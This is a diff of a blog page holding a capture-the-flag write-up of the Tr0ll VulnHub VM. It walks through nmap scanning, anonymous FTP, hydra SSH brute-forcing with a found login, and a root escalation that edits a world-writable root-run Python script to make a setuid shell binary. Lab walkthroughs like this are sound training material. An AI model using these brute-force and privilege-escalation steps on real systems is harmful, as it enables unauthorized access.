@@ -77,50 +77,64 @@
 <div class="content container">
   <div class="post">
     <h1>taming (actually just solving) the troll</h1>
-    <span class="post-date">Aug 15, 2014 &middot; 9 minute read &middot; <a href="https://leonjza.github.io/2014/08/15/taming-the-troll/#disqus_thread">Comments</a>
+    <span class="post-date">Aug 15, 2014 &middot; 8 minute read &middot; <a href="https://leonjza.github.io/2014/08/15/taming-the-troll/#disqus_thread">Comments</a>
     
     <br/>
     <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
     </span>
     
 
-<p>##foreword
-Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>
+<h2 id="foreword:0308f0b3905abd0adc5f6451e7495cbf">foreword</h2>
 
-<p>##nomad, promise
-As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>
+<p>Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>
 
-<p>```bash Tr0ll nmap
-root@kali:~# nmap -v &ndash;reason -sV 192.168.56.101 -p-</p>
+<h2 id="nomad-promise:0308f0b3905abd0adc5f6451e7495cbf">nomad, promise</h2>
 
-<p>PORT   STATE SERVICE REASON  VERSION
+<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>
+
+<pre><code class="language-bash">root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-
+
+PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.2
 22/tcp open  ssh     syn-ack (protocol 2.0)
-80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))</p>
+80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
+</code></pre>
 
-<pre><code>
-So, `ssh`, `ftp`, and `http`. Naturally my first reaction was to inspect the web service.
+<p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>
 
-{% img https://i.imgur.com/SiNzlyi.png %}
 
-The `robots.txt` file revealed:
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll_web.png" />
+    
+    
+</figure>
 
-```text Tr0ll robots.txt
-User-agent:*
+
+<p>The <code>robots.txt</code> file revealed:</p>
+
+<pre><code class="language-text">User-agent:*
 Disallow: /secret
 </code></pre>
 
 <p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>
 
-<p>{% img <a href="https://i.imgur.com/E2SezsL.png">https://i.imgur.com/E2SezsL.png</a> %}</p>
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll_secret_path.png" />
+    
+    
+</figure>
+
 
 <p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>
 
-<p>##anonny-mouse ftp
-A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>
+<h2 id="anonny-mouse-ftp:0308f0b3905abd0adc5f6451e7495cbf">anonny-mouse ftp</h2>
 
-<p>```bash Tr0ll ftp login
-root@kali:~# ftp 192.168.56.101
+<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>
+
+<pre><code class="language-bash">root@kali:~# ftp 192.168.56.101
 Connected to 192.168.56.101.
 220 (vsFTPd 3.0.2)
 Name (192.168.56.101:root): anonymous
@@ -128,113 +142,122 @@ Name (192.168.56.101:root): anonymous
 Password:
 230 Login successful.
 Remote system type is UNIX.
-Using binary mode to transfer files.</p>
+Using binary mode to transfer files.
 
-<p>ftp&gt; ls
+ftp&gt; ls
 500 Illegal PORT command.
-ftp: bind: Address already in use</p>
+ftp: bind: Address already in use
 
-<p>ftp&gt; passive
-Passive mode on.</p>
+ftp&gt; passive
+Passive mode on.
 
-<p>ftp&gt; ls
+ftp&gt; ls
 227 Entering Passive Mode (192,168,56,101,231,190)
 150 Here comes the directory listing.
 -rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
-226 Directory send OK.</p>
+226 Directory send OK.
 
-<p>ftp&gt; get lol.pcap
+ftp&gt; get lol.pcap
 local: lol.pcap remote: lol.pcap
 227 Entering Passive Mode (192,168,56,101,189,113)
 150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
 226 Transfer complete.
-8068 bytes received in 0.00 secs (21294.3 kB/s)</p>
+8068 bytes received in 0.00 secs (21294.3 kB/s)
 
-<p>ftp&gt; bye
-221 Goodbye.</p>
+ftp&gt; bye
+221 Goodbye.
+</code></pre>
 
-<pre><code>
-Well that worked, and showed that we have a file `lol.pcap` to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called `secret_stuff.txt` that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:
+<p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>
 
-{% img https://i.imgur.com/vpgEP3o.png %}
 
-Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary  called `roflmao`. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll_pcap.png" />
+    
+    
+</figure>
 
-```bash Tr0ll roflmao file
-root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
+
+<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to <a href="http://192.168.56.101/sup3rs3cr3tdirlol/">http://192.168.56.101/sup3rs3cr3tdirlol/</a>. In this path there was a binary  called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>
+
+<pre><code class="language-bash">root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
 --2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
 Connecting to 192.168.56.101:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 7296 (7.1K)
 Saving to: `roflmao'
 
-100%[======&gt;] 7,296       --.-K/s   in 0s      
+100%[======&gt;] 7,296       --.-K/s   in 0s
 
 2014-08-15 07:57:56 (826 MB/s) - `roflmao' saved [7296/7296]
 
-root@kali:~/Desktop/Tr0ll# chmod +x roflmao 
-root@kali:~/Desktop/Tr0ll# ./roflmao 
+root@kali:~/Desktop/Tr0ll# chmod +x roflmao
+root@kali:~/Desktop/Tr0ll# ./roflmao
 Find address 0x0856BF to proceed
 </code></pre>
 
 <p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried <a href="http://192.168.56.101/0x0856BF/:">http://192.168.56.101/0x0856BF/:</a></p>
 
-<p>{% img <a href="https://i.imgur.com/yXWgKij.png">https://i.imgur.com/yXWgKij.png</a> %}</p>
 
-<p>##nohydraplz</p>
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll_0x856bf.png" />
+    
+    
+</figure>
+
+
+<h2 id="nohydraplz:0308f0b3905abd0adc5f6451e7495cbf">nohydraplz</h2>
 
 <p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>
 
-<p>```text which_one_lol.txt
-maleus
+<pre><code class="language-text">maleus
 ps-aux
 felux
 Eagle11
-genphlux &lt; &ndash; Definitely not this one
+genphlux &lt; -- Definitely not this one
 usmc8892
 blawrg
 wytshadow
 vis1t0r
-overflow</p>
+overflow
+</code></pre>
 
-<pre><code>
-List of passwords? Dunno. The folder `this_folder_contains_the_password` had a file `Pass.txt` with contents:
+<p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>
 
-```text Pass.txt
-Good_job_:)
+<pre><code class="language-text">Good_job_:)
 </code></pre>
 
 <p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>
 
-<p>```bash Tr0ll hydra
-root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
-Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+<pre><code class="language-bash">root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
+Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only
 
-<p>[DATA] attacking service ssh on port 22
-[VERBOSE] Resolving addresses &hellip; done
-[ATTEMPT] target 192.168.56.101 - login &ldquo;maleus&rdquo; - pass &ldquo;maleus&rdquo; - 1 of 169 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;ps-aux&rdquo; - pass &ldquo;maleus&rdquo; - 2 of 169 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;felux&rdquo; - pass &ldquo;maleus&rdquo; - 3 of 169 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;Eagle11&rdquo; - pass &ldquo;maleus&rdquo; - 4 of 169 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;genphlux &lt; &ndash; Definitely not this one&rdquo; - pass &ldquo;maleus&rdquo; - 5 of 169 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;genphlux&rdquo; - pass &ldquo;maleus&rdquo; - 6 of 169 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;usmc8892&rdquo; - pass &ldquo;maleus&rdquo; - 7 of 169 [child 0]</p>
+[DATA] attacking service ssh on port 22
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 192.168.56.101 - login &quot;maleus&quot; - pass &quot;maleus&quot; - 1 of 169 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;ps-aux&quot; - pass &quot;maleus&quot; - 2 of 169 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;felux&quot; - pass &quot;maleus&quot; - 3 of 169 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;Eagle11&quot; - pass &quot;maleus&quot; - 4 of 169 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;genphlux &lt; -- Definitely not this one&quot; - pass &quot;maleus&quot; - 5 of 169 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;genphlux&quot; - pass &quot;maleus&quot; - 6 of 169 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;usmc8892&quot; - pass &quot;maleus&quot; - 7 of 169 [child 0]
 
-<p>[ERROR] could not connect to target port 22
+[ERROR] could not connect to target port 22
 [ERROR] ssh protocol error
 [VERBOSE] Retrying connection for child 0
-[RE-ATTEMPT] target 192.168.56.101 - login &ldquo;usmc8892&rdquo; - pass &ldquo;maleus&rdquo; - 7 of 169 [child 0]</p>
+[RE-ATTEMPT] target 192.168.56.101 - login &quot;usmc8892&quot; - pass &quot;maleus&quot; - 7 of 169 [child 0]
 
-<p>[ERROR] could not connect to target port 22
+[ERROR] could not connect to target port 22
 [ERROR] ssh protocol error
 [VERBOSE] Retrying connection for child 0
-[RE-ATTEMPT] target 192.168.56.101 - login &ldquo;usmc8892&rdquo; - pass &ldquo;maleus&rdquo; - 7 of 169 [child 0]</p>
+[RE-ATTEMPT] target 192.168.56.101 - login &quot;usmc8892&quot; - pass &quot;maleus&quot; - 7 of 169 [child 0]
+</code></pre>
 
-<pre><code>
-Err, the sudden errors only meant one thing... `fail2ban`.
+<p>Err, the sudden errors only meant one thing&hellip; <code>fail2ban</code>.</p>
 
-```bash Tr0ll ssh filtered
-root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22
+<pre><code class="language-bash">root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22
 
 PORT   STATE    SERVICE REASON
 22/tcp filtered ssh     no-response
@@ -243,32 +266,31 @@ PORT   STATE    SERVICE REASON
 
 <p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :\&rdquo;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>
 
-<p>##first shell
-I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>
+<h2 id="first-shell:0308f0b3905abd0adc5f6451e7495cbf">first shell</h2>
+
+<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>
 
 <p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>
 
 <p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>
 
-<p>``<code>bash Tr0ll hydra success</code>
-root@kali:~# hydra -v -V -u -L list -p &ldquo;Pass.txt&rdquo; -t 1 -u 192.168.56.101 ssh
-Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+<pre><code class="language-bash">root@kali:~# hydra -v -V -u -L list -p &quot;Pass.txt&quot; -t 1 -u 192.168.56.101 ssh
+Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only
 
-<p>[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
+[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
 [DATA] attacking service ssh on port 22
-[VERBOSE] Resolving addresses &hellip; done
-[ATTEMPT] target 192.168.56.101 - login &ldquo;maleus&rdquo; - pass &ldquo;Pass.txt&rdquo; - 1 of 13 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;ps-aux&rdquo; - pass &ldquo;Pass.txt&rdquo; - 2 of 13 [child 0]
-[ATTEMPT] target 192.168.56.101 - login &ldquo;felux&rdquo; - pass &ldquo;Pass.txt&rdquo; - 3 of 13 [child 0]
-[&hellip;]
-[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt</p>
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 192.168.56.101 - login &quot;maleus&quot; - pass &quot;Pass.txt&quot; - 1 of 13 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;ps-aux&quot; - pass &quot;Pass.txt&quot; - 2 of 13 [child 0]
+[ATTEMPT] target 192.168.56.101 - login &quot;felux&quot; - pass &quot;Pass.txt&quot; - 3 of 13 [child 0]
+[...]
+[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
+</code></pre>
 
-<pre><code>
-Yay `overflow:Pass.txt` should get us a session via ssh:
+<p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>
 
-```bash Tr0ll ssh
-root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
-overflow@192.168.56.101's password: 
+<pre><code class="language-bash">root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
+overflow@192.168.56.101's password:
 Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
 
 [...]
@@ -278,30 +300,29 @@ $ id
 uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
 </code></pre>
 
-<p>##&hellip; and root
-And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>
+<h2 id="and-root:0308f0b3905abd0adc5f6451e7495cbf">&hellip; and root</h2>
+
+<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>
 
 <p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>
 
 <p><em>suddenly</em></p>
 
-<p>```bash Tr0ll times up
-Broadcast Message from root@trol<br />
-        (somewhere) at 16:05 &hellip;</p>
+<pre><code class="language-bash">Broadcast Message from root@trol
+        (somewhere) at 16:05 ...
 
-<p>TIMES UP LOL!</p>
+TIMES UP LOL!
 
-<p>Connection to 192.168.56.101 closed by remote host.
+Connection to 192.168.56.101 closed by remote host.
 Connection to 192.168.56.101 closed.
-root@kali:~#</p>
+root@kali:~#
+</code></pre>
 
-<pre><code>
-Urgh. Turns out, something is killing my ssh session every 5 minutes. **Oh my word**, was that annoying. I could handle everything the VM's offered, but this was probably the worst part of it.
+<p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>
 
-Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the _thing_ I should be finding has a more recent timestamp:
+<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>
 
-```bash Tr0ll check 
-overflow@troll:/$ find / -executable -type f 2&gt; /dev/null | egrep -v &quot;^/bin|^/var|^/etc|^/usr&quot; | xargs ls -lh | grep Aug
+<pre><code class="language-bash">overflow@troll:/$ find / -executable -type f 2&gt; /dev/null | egrep -v &quot;^/bin|^/var|^/etc|^/usr&quot; | xargs ls -lh | grep Aug
 
 -rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
 -rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
@@ -313,20 +334,18 @@ overflow@troll:/$ find / -executable -type f 2&gt; /dev/null | egrep -v &quot;^/
 
 <p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>
 
-<p>```python cleaner.py
-#!/usr/bin/env python
+<pre><code class="language-python">#!/usr/bin/env python
 import os
 import sys
 try:
-    os.system(&lsquo;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &lsquo;)
+    os.system('chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot ')
 except:
-    sys.exit()</p>
+    sys.exit()
+</code></pre>
 
-<pre><code>
-I waited for that annoying 'Times UP' message, and inspected `/var/tmp`:
+<p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>
 
-```bash rooted
-overflow@troll:/$ ls -lah /var/tmp/
+<pre><code class="language-bash">overflow@troll:/$ ls -lah /var/tmp/
 total 24K
 drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
 drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
@@ -334,7 +353,7 @@ drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
 -rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
 -rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c
 
-overflow@troll:/$ /var/tmp/getroot 
+overflow@troll:/$ /var/tmp/getroot
 #
 # id
 uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)
@@ -343,28 +362,27 @@ uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)
 proof.txt
 
 # cat /root/proof.txt
-Good job, you did it! 
+Good job, you did it!
 
 
 702a8c18d29c6f3ca0d99ef5712bfbdc
 #
 </code></pre>
 
-<p>##for the curious
-That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>
+<h2 id="for-the-curious:0308f0b3905abd0adc5f6451e7495cbf">for the curious</h2>
 
-<p>```python grr</p>
+<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>
 
-<h1 id="cat-opt-lmao-py:0308f0b3905abd0adc5f6451e7495cbf">cat /opt/lmao.py</h1>
+<pre><code class="language-python"># cat /opt/lmao.py
+#!/usr/bin/env python
+import os
 
-<p>#!/usr/bin/env python
-import os</p>
+os.system('echo &quot;TIMES UP LOL!&quot;|wall')
+os.system(&quot;pkill -u 'overflow'&quot;)
+sys.exit()
 
-<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
-os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
-sys.exit()</p>
-
-<p>```</p>
+#
+</code></pre>
 
 <p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>
 
